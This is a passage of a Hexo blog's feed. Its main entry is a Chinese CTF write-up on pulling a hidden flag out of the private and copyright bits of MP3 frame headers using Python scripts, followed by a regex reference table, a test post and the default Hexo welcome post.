&lt;p&gt;将解压后的 &lt;code&gt;1.mp3&lt;/code&gt;  文件用 010Editor 打开&lt;/p&gt;
&lt;p&gt;可以看到一个 mp3 文件，里面基本上由 mf 数组构成。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917115510767.png&#34; alt=&#34;image-20220917115510767&#34;&gt;&lt;/p&gt;
&lt;p&gt;分析详见图片&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917120013835.png&#34; alt=&#34;image-20220917120013835&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着，可以发现，每个 mf 数组大小不一，有的是 0x1A1，有的 0x1A2&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917120301874.png&#34; alt=&#34;image-20220917120301874&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;图中可知，private_bit 的数值的在 0 和 1 中变化，可以让 &lt;code&gt;copyright&lt;/code&gt;  、 &lt;code&gt;private_bit&lt;/code&gt;  这样的单 bit 位在 0 和 1 之间发生改变，进而影响了单独 mf 数组的大小。因此，这两位在整个 mf 数组中连续拼接可能藏有 flag 或者重要的信息，优先提取。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;0x03-解析脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-解析脚本&#34;&gt;#&lt;/a&gt; 0x03 解析脚本&lt;/h2&gt;
&lt;p&gt;脚本如下：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;# coding:utf-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   n = &lt;span class=&#34;number&#34;&gt;0x399D0&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 起始位置，为什么+2 下面有解释&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   target_bit = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   flag = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   file = &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1.mp3&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 以二进制打开文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;# 提取&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; n &amp;lt; &lt;span class=&#34;number&#34;&gt;0x294C6A&lt;/span&gt;:  &lt;span class=&#34;comment&#34;&gt;# 结束位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       file.seek(n, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       byte = file.read(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;#往后读取一个字节（8位）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       padding = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#从中提取倒数第2个bit 也就是padding的值 ord函数，是chr函数的对应，将字符变成10进制数字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       target_bit += &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#从中提取倒数第1个bit 也就是private_bit的值，需要累加拼接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; padding == &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           n += &lt;span class=&#34;number&#34;&gt;0x1A2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           n += &lt;span class=&#34;number&#34;&gt;0x1A1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(target_bit)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#textArr = re.findall(&amp;#x27;.&amp;#123;&amp;#x27;+str(8)+&amp;#x27;&amp;#125;&amp;#x27;, result)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   textArr = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\d&amp;#123;8&amp;#125;&amp;#x27;&lt;/span&gt;, target_bit) &lt;span class=&#34;comment&#34;&gt;#利用正则匹配每8个数字为一组，将其变为字符串数组方便处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(textArr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; textArr:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       flag += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(i, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)).strip(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#int(&amp;#x27;二进制数&amp;#x27;, 2) 就转成了10进制   chr(&amp;#x27;10进制数&amp;#x27;) 就转成字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#print(flag) #发现后面有很多未知空字符，删也删不掉&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   flag = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\w+\&amp;#123;.+\&amp;#125;&amp;#x27;&lt;/span&gt;,flag) &lt;span class=&#34;comment&#34;&gt;#用正则匹配标准flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(flag[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p 0k4_YOu_Seem_s0_cl3ver_t0_find_f1ag!=&#34;&#34;&gt;flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917134916608.png&#34; alt=&#34;image-20220917134916608&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04-常用正则补充&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04-常用正则补充&#34;&gt;#&lt;/a&gt; 0x04 常用正则 (补充)&lt;/h2&gt;
&lt;p&gt;①&lt;strong&gt;显示不可打印的字符&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字符&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;\a&lt;/td&gt;
&lt;td&gt;报警&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\b&lt;/td&gt;
&lt;td&gt;退格&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\f&lt;/td&gt;
&lt;td&gt;换页&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\n&lt;/td&gt;
&lt;td&gt;换行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\r&lt;/td&gt;
&lt;td&gt;回车&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\t&lt;/td&gt;
&lt;td&gt;字表符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;②&lt;strong&gt;指定预定义的字符集&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字符&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;\d&lt;/td&gt;
&lt;td&gt;任意一个十进制数字 [0-9]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\D&lt;/td&gt;
&lt;td&gt;任意一个非十进制数字&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\s&lt;/td&gt;
&lt;td&gt;任意一个空白字符 (空格、换行符、换页符、回车符、字表符)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\S&lt;/td&gt;
&lt;td&gt;任意一个非空白字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\w&lt;/td&gt;
&lt;td&gt;任意一个单词字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\W&lt;/td&gt;
&lt;td&gt;任意个非单词字符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;③&lt;strong&gt;限定符 (？*+{n，m}.)&lt;/strong&gt;&lt;br&gt;
 限定符主要是用来限定每个字符串出现的次数。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;限定字符&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;？&lt;/td&gt;
&lt;td&gt;零次或一次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;td&gt;零次或多次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td&gt;一次或多次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td n=&#34;&#34;&gt;&lt;/td&gt;
&lt;td&gt;n 次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td n,=&#34;&#34;&gt;&lt;/td&gt;
&lt;td&gt;至少 n 次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td n,m=&#34;&#34;&gt;&lt;/td&gt;
&lt;td&gt;n 到 m 次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.&lt;/td&gt;
&lt;td&gt;匹配任意一个字符（不包含换行符）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;0x05-再来一道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x05-再来一道&#34;&gt;#&lt;/a&gt; 0x05 再来一道&lt;/h2&gt;
&lt;p&gt;翻看了几帧发现 &lt;code&gt;private_bit&lt;/code&gt;  位都是 0，似乎并没有存储数据。但是在翻看的时候发现，&lt;ins&gt; &lt;code&gt;uint32 copyright&lt;/code&gt;  这一位似乎内藏玄机&lt;/ins&gt;，这一位在相邻几帧的数据有 0 有 1，查询得知这是版权位，通常不会出现不同帧有 0 有 1 的情况。&lt;/p&gt;
&lt;p&gt;于是决定将 &lt;code&gt;copyright&lt;/code&gt;  位的数据提取出来看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917134512128.png&#34; alt=&#34;image-20220917134512128&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# coding:utf-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;n = &lt;span class=&#34;number&#34;&gt;0xF05A4&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 起始位置，为什么+2 下面有解释&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_bit = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file = &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;2.mp3&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 以二进制打开文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 提取&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; n &amp;lt; &lt;span class=&#34;number&#34;&gt;0xC12623&lt;/span&gt;:  &lt;span class=&#34;comment&#34;&gt;# 结束位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file.seek(n, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    byte = file.read(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 往后读取一个字节（8位）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    padding = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]  &lt;span class=&#34;comment&#34;&gt;# 从中提取倒数第2个bit 也就是padding的值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file.seek(n + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    byte = file.read(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    target_bit += &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]  &lt;span class=&#34;comment&#34;&gt;# 从中提取倒数第1个bit 也就是copyright的值，需要累加拼接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; padding == &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n += &lt;span class=&#34;number&#34;&gt;0x415&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n += &lt;span class=&#34;number&#34;&gt;0x414&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(target_bit)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# textArr = re.findall(&amp;#x27;.&amp;#123;&amp;#x27;+str(8)+&amp;#x27;&amp;#125;&amp;#x27;, result)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;textArr = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\d&amp;#123;8&amp;#125;&amp;#x27;&lt;/span&gt;, target_bit)  &lt;span class=&#34;comment&#34;&gt;# 利用正则匹配每8个数字为一组，将其变为字符串数组方便处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(textArr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; textArr:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    flag += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(i, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)).strip(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# int(&amp;#x27;二进制数&amp;#x27;, 2) 就转成了10进制   chr(&amp;#x27;10进制数&amp;#x27;) 就转成字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\w+\&amp;#123;.+\&amp;#125;&amp;#x27;&lt;/span&gt;,flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(flag[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p b3d7bed5-e8da-4d9c-848c-e5d332d63bcd=&#34;&#34;&gt;flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917134626086.png&#34; alt=&#34;image-20220917134626086&#34;&gt;&lt;/p&gt;
</content>
        <category term="CTF小训" />
        <category term="Misc" />
        <updated>2022-09-17T06:02:32.000Z</updated>
    </entry>
    <entry>
        <id>https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</id>
        <title>测试文章</title>
        <link rel="alternate" href="https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
        <content type="html">&lt;p&gt;这是一篇测试文章&lt;/p&gt;
&lt;img src=&#34;/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png&#34; class=&#34;&#34; title=&#34;图片引用方法一&#34;&gt;
&lt;p&gt;&lt;img src=&#34;test.png&#34; alt=&#34;图片引用方法二&#34;&gt;&lt;/p&gt;
</content>
        <category term="原创" />
        <updated>2022-07-13T19:13:28.000Z</updated>
    </entry>
    <entry>
        <id>https://kiyomijin.github.io/2022/07/13/hello-world/</id>
        <title>Hello World</title>
        <link rel="alternate" href="https://kiyomijin.github.io/2022/07/13/hello-world/"/>
        <content type="html">&lt;p&gt;Welcome to &lt;a href=&#34;https://hexo.io/&#34;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&#34;https://hexo.io/docs/&#34;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&#34;https://hexo.io/docs/troubleshooting.html&#34;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&#34;https://github.com/hexojs/hexo/issues&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
</content>
        <updated>2022-07-13T15:20:21.111Z</updated>
    </entry>
</feed>
